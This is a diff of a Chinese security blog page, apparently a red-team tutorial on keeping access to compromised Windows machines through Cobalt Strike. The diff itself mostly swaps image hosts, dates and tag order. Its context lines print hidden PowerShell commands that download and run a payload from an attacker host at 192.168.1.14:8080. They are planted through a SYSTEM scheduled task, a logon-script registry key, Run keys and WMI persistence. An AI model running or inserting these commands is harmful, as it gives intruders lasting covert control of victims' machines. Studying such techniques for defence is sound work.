@@ -15,22 +15,22 @@
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
 <meta property="og:description" content="背景在拿到目标系统权限之后，为了防止权限不会因系统重启或其他情况而丢失，需要建立一个持久化的据点，本文收集和整理了几种常见权限维持的技巧，目前这几种方法均会被杀软拦截，所有操作均在cs上完成。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.laohuan.art/2021-04-24_16-26.png">
-<meta property="og:image" content="https://cdn.laohuan.art/2021-04-24_16-31.png">
-<meta property="og:image" content="https://cdn.laohuan.art/2021-04-24_16-37.png">
-<meta property="og:image" content="https://cdn.laohuan.art/2021-04-24_17-20.png">
-<meta property="og:image" content="https://cdn.laohuan.art/2021-04-24_20-10.png">
-<meta property="og:image" content="https://cdn.laohuan.art/2021-04-24_20-03.png">
-<meta property="og:image" content="https://cdn.laohuan.art/2021-04-28_21-03.png">
-<meta property="og:image" content="https://cdn.laohuan.art/2021-04-28_21-27.png">
-<meta property="og:image" content="https://cdn.laohuan.art/2021-04-28_21-38.png">
-<meta property="og:image" content="https://cdn.laohuan.art/2021-04-28_21-39.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2021-04-24_16-26.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2021-04-24_16-31.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2021-04-24_16-37.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2021-04-24_17-20.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2021-04-24_20-10.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2021-04-24_20-03.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2021-04-28_21-03.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2021-04-28_21-27.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2021-04-28_21-38.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2021-04-28_21-39.png">
 <meta property="article:published_time" content="2021-05-23T05:15:04.000Z">
-<meta property="article:modified_time" content="2021-05-24T14:15:18.946Z">
+<meta property="article:modified_time" content="2025-01-06T09:35:36.440Z">
 <meta property="article:author" content="Laohuan">
 <meta property="article:tag" content="权限维持">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.laohuan.art/2021-04-24_16-26.png">
+<meta name="twitter:image" content="http://qn.laohuan.xin/2021-04-24_16-26.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -48,7 +48,7 @@
 
   
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -290,12 +290,12 @@
 <p>这里采用无文件落地方式，不然可直接将<strong>/d</strong>参数后跟上可执行文件后门路径即可</p>
 <p>若找不到powershell路径，可切换到根目录试试如下命令</p>
 <p><code>dir /s /b powershell.exe</code></p>
-<p><img src="https://cdn.laohuan.art/2021-04-24_16-26.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2021-04-24_16-26.png" alt></p>
 <p>查询刚刚添加的键值</p>
 <p><code>shell reg query hklm\software\microsoft\windows\currentversion\run</code></p>
-<p><img src="https://cdn.laohuan.art/2021-04-24_16-31.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2021-04-24_16-31.png" alt></p>
 <p>重启之后可上线</p>
-<p><img src="https://cdn.laohuan.art/2021-04-24_16-37.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2021-04-24_16-37.png" alt></p>
 <h5><span id="计划任务">计划任务</span></h5><p>计划任务在win8之前使用at命令，之后使用schtasks命令来创建或删除计划任务</p>
 <p>此处创建的计划任务通过<strong>/ru system</strong>命令以管理员权限启动，所以创建此计划任务同样需要管理员权限。</p>
 <figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /tn update /tr <span class="string">"c:\windows\system32\windowspowershell\v1.0\powershell.exe -windowstyle hidden -Nologo -Noninteractive -ep bypass -nop -c 'IEX((new-object net.webclient).downloadstring(''http://192.168.1.14:8080/a'''))'"</span> /sc onstart /ru system</span><br></pre></td></tr></table></figure>
@@ -306,12 +306,12 @@
 <li>onlogon 用户登陆</li>
 <li>onidle  /i 1 系统空闲,<strong>/i</strong>参数指定系统必须持续空闲1分钟才启动计划任务</li>
 </ol>
-<p><img src="https://cdn.laohuan.art/2021-04-24_17-20.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2021-04-24_17-20.png" alt></p>
 <p>查看创建的计划任务</p>
 <p><code>shell schtasks /query /fo list /tn update /v</code></p>
-<p><img src="https://cdn.laohuan.art/2021-04-24_20-10.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2021-04-24_20-10.png" alt></p>
 <p>重启上线</p>
-<p><img src="https://cdn.laohuan.art/2021-04-24_20-03.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2021-04-24_20-03.png" alt></p>
 <h5><span id="启动项">启动项</span></h5><p>放在自启动目录下的程序或快捷方式在用户登陆时都会自动启动</p>
 <ul>
 <li><p>当前用户</p>
@@ -338,23 +338,23 @@
 <p>创建<strong>UserInitMprLogonScript</strong>键值</p>
 <figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell reg add  HKCU\Environment  /v UserInitMprLogonScript /t REG_SZ  /d <span class="string">"c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -w hidden -c \"</span>IEX((<span class="keyword">new</span>-object net.webclient).downloadstring(<span class="comment">'http://192.168.1.14:8080/a'))\"" /f</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.laohuan.art/2021-04-28_21-03.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2021-04-28_21-03.png" alt></p>
 <h5><span id="wmi">WMI</span></h5><p>windows可通过WMI使用命令行或批处理命令来管理系统，相当于一个可与系统交互的API,windows默认安装。</p>
 <p>网上已有利用WMI做权限维持的脚本</p>
-<p><a href="https://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1" target="_blank" rel="noopener"><strong>WMI-Persistence.ps1</strong></a></p>
+<p><a href="http://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1" target="_blank" rel="noopener"><strong>WMI-Persistence.ps1</strong></a></p>
 <p>修改payload</p>
-<p><img src="https://cdn.laohuan.art/2021-04-28_21-27.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2021-04-28_21-27.png" alt></p>
 <p>1.<code>powershell-import /home/kali/software/WMI-Persistence.ps1</code></p>
 <p>2.<code>powershell Install-Persistence</code></p>
 <p>3.<code>powershell Check-WMI</code></p>
 <p>删除，不然会一直轮循弹shell回来</p>
 <p>4.powershell  Remove-Persistence</p>
-<p><img src="https://cdn.laohuan.art/2021-04-28_21-38.png" alt></p>
-<p><img src="https://cdn.laohuan.art/2021-04-28_21-39.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2021-04-28_21-38.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2021-04-28_21-39.png" alt></p>
 <h4><span id="后话">后话</span></h4><p>目前上述所有方法都会被杀软拦截，除了对可执行程序的免杀之外，如何在杀软不会拦截的情况下实现权限维持是需要继续研究的点，上述只是一般权限维持的常见手法，还有许多思路奇特新颖的方法等着去尝试。</p>
 <h4><span id="参考链接">参考链接</span></h4><ul>
-<li><a href="https://www.freebuf.com/articles/system/229209.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/229209.html</a></li>
-<li><a href="https://xz.aliyun.com/t/8095" target="_blank" rel="noopener">https://xz.aliyun.com/t/8095</a></li>
+<li><a href="http://www.freebuf.com/articles/system/229209.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/229209.html</a></li>
+<li><a href="http://xz.aliyun.com/t/8095" target="_blank" rel="noopener">http://xz.aliyun.com/t/8095</a></li>
 </ul>
 
       
@@ -557,7 +557,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2023 Laohuan
+    		&copy; 2025 Laohuan
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -677,6 +677,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CGI</a>
               </li>
              
@@ -685,7 +689,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">考试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -693,7 +705,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -705,7 +717,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
+                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -713,7 +725,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -721,7 +733,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Weblogic</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -737,6 +757,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">zabbix</a>
               </li>
              
@@ -745,39 +769,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">考试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">加解密</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
               </li>
             
             <div class="clearfix"></div>
